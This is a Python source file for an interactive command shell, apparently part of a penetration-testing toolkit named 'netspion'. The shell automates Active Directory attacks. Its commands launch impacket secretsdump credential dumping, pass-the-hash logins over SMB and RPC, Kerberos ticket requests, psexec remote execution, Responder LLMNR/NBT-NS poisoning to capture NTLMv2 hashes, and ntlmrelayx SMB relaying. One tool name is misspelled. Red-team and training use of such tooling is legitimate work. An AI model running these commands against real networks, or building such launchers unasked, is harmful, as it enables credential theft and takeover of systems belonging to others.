import cmd2, platform, subprocess, os
from cmd2 import CommandSet, with_default_category
import utils.string_format as sf
import utils.run_task as rt
from utils.check_var import check_vars

PLATFORM_SYSTEM = platform.system()


@with_default_category("Main commands")
class ADHacking(cmd2.Cmd):
    intro = sf.text(
        "netspion Tools Active Directory Sub menu. Type help or ? to list commands and help/? COMMAND to show COMMAND help. \n"
    )
    prompt = sf.success("(netspion AD-Hacking): ")

    def __init__(self):
        super().__init__(auto_load_commands=False)
        self.resultsPath = "/tmp/netspion/ActiveDirectory/"
        self.domain = ""
        self.target_path = ""
        self.user = ""
        self.hash = ""
        self.addr = ""
        self.target_name = ""
        self.service = ""
        self.interface = ""
        self.network = ""
        self.targets_file = f"{self.resultsPath}targets.txt"
        self.add_settable(
            cmd2.Settable(
                "domain", str, "Target Domain Name (i.e: example.local)", self
            )
        )
        self.add_settable(cmd2.Settable("targets_file", str, "Targets file path", self))
        self.add_settable(
            cmd2.Settable("network", str, "Target network (i.e: 192.168.0.0/24)", self)
        )
        self.add_settable(
            cmd2.Settable(
                "interface", str, "Local interface to listen (i.e: eth0)", self
            )
        )
        self.add_settable(cmd2.Settable("service", str, "Target service name", self))
        self.add_settable(
            cmd2.Settable("target_name", str, "Target hostname (i.e: WS-01)", self)
        )
        self.add_settable(
            cmd2.Settable("target_path", str, "Format: //IP_ADDR/DIRECTORY_PATH", self)
        )
        self.add_settable(cmd2.Settable("addr", str, "Target IP Address", self))
        self.add_settable(cmd2.Settable("user", str, "Target Domain Username", self))
        self.add_settable(
            cmd2.Settable("hash", str, "Target Credential Hash string", self)
        )
        self.default_category = "cmd2 Built-in Commands"
        self.remove_settable("debug")
        self.remove_settable("allow_style")
        self.remove_settable("always_show_hint")
        self.remove_settable("echo")
        self.remove_settable("feedback_to_output")
        self.remove_settable("max_completion_items")
        self.remove_settable("quiet")
        self.remove_settable("timing")
        self.poutput(
            sf.info("RUNNING ON: ")
            + sf.success(PLATFORM_SYSTEM + platform.release() + platform.version())
        )
        self.poutput(
            sf.info("ALL RESULTS WILL BE STORED IN: ")
            + sf.success(self.resultsPath)
            + "\n"
        )
        os.makedirs(self.resultsPath, exist_ok=True)
        self.do_help("-v")

    def do_clear(self, arg):
        "Clear screen"
        subprocess.run(["clear"], shell=True)

    def do_secrets_dump_hashfile(self, arg):
        "Impacket secrets dump from hashfile"
        if check_vars(
            [
                {"name": "domain", "value": self.domain},
                {"name": "user", "value": self.user},
            ]
        ):
            rt.runBackground(["impacket-secretdsump", self.domain + "/" + self.user])

    def do_pth_smb(self, arg):
        "Pass the Hash (SMB Client)"
        if check_vars(
            [
                {"name": "target_path", "value": self.target_path},
                {"name": "user", "value": self.user},
                {"name": "hash", "value": self.hash},
                {"name": "domain", "value": self.domain},
            ]
        ):
            rt.runBackground(
                [
                    "pth-smbclient",
                    self.target_path,
                    "-U",
                    self.user,
                    "--pw-nt-hash",
                    self.hash,
                    "-W",
                    self.domain,
                ]
            )

    def do_pth_rpc(self, arg):
        "Pass the Hash (RPC Client)"
        if check_vars(
            [
                {"name": "domain", "value": self.domain},
                {"name": "user", "value": self.user},
                {"name": "hash", "value": self.hash},
                {"name": "addr", "value": self.addr},
            ]
        ):
            rt.runBackground(
                [
                    "pth-rpcclient",
                    "-U",
                    self.domain + "/" + self.user + "%:" + self.hash,
                    "//" + self.addr,
                ]
            )

    def do_get_tgt(self, arg):
        "Impacket get Ticket Granting Ticket (Hash NTLM)"
        if check_vars(
            [
                {"name": "domain", "value": self.domain},
                {"name": "user", "value": self.user},
                {"name": "hash", "value": self.hash},
            ]
        ):
            rt.runBackground(
                [
                    "impacket-getTGT",
                    self.domain + "/" + self.user,
                    "-hashes",
                    ":" + self.hash,
                ]
            )

    def do_secrets_dump_kerberos(self, arg):
        "Impacket secrets dump (TGT Kerberos)"
        if check_vars(
            [
                {"name": "domain", "value": self.domain},
                {"name": "user", "value": self.user},
                {"name": "target_name", "value": self.target_name},
            ]
        ):
            rt.runBackground(
                [
                    "impacket-secretsdump",
                    self.domain + "/" + self.user + "@" + self.target_name,
                    "-k",
                    "-no-pass",
                ]
            )

    def do_ps_exec(self, arg):
        "Impacket Powershell Exec (TGT Kerberos)"
        if check_vars(
            [
                {"name": "domain", "value": self.domain},
                {"name": "user", "value": self.user},
                {"name": "target_name", "value": self.target_name},
            ]
        ):
            rt.runBackground(
                [
                    "impacket-psexec",
                    self.domain + "/" + self.user + "@" + self.target_name,
                    "-k",
                    "-no-pass",
                ]
            )

    def do_get_st(self, arg):
        "Impacket get Service Ticket (TGT Kerberos)"
        if check_vars(
            [
                {"name": "service", "value": self.service},
                {"name": "target_name", "value": self.target_name},
                {"name": "domain", "value": self.domain},
                {"name": "user", "value": self.user},
            ]
        ):
            rt.runBackground(
                [
                    "impacket-getST",
                    "-spn",
                    self.service + "/" + self.target_name,
                    "-no-pass",
                    "-k",
                    self.domain + "/" + self.user,
                ]
            )

    def do_get_ntlmv2_hash(self, arg):
        "Get NTLMv2 Hash (LLMNR/NBTNS Poison) using responder"
        if check_vars([{"name": "interface", "value": self.interface}]):
            rt.runBackground(["responder", "-I", self.interface, "-Pv"])

    def do_ntlmsmb_relay(self, arg):
        if check_vars(
            [
                {"name": "network", "value": self.network},
                {"name": "interface", "value": self.interface},
            ]
        ):
            "NTLM/SMB Relay"
            rt.runBackground(["crackmapexec", "smb", self.network])
            print("Generating targets.txt\n")
            f = open(self.targets_file, "w")
            while True:
                tmp_target = str(input("Target IP Addr: "))
                f.write(tmp_target + "\n")
                ans = str(input("Stop? [y/n]: "))
                if ans == "y" or ans == "Y":
                    break
            f.close()
            rt.runBackground(
                [
                    "impacket-ntlmrelayx",
                    "-smb2support",
                    "-tf",
                    self.targets_file,
                    "-socks",
                ]
            )
            rt.runBackground(["responder", "-I", self.interface, "-Pv"])


def main():
    ADHacking().do_clear(1)
    ADHacking().cmdloop()
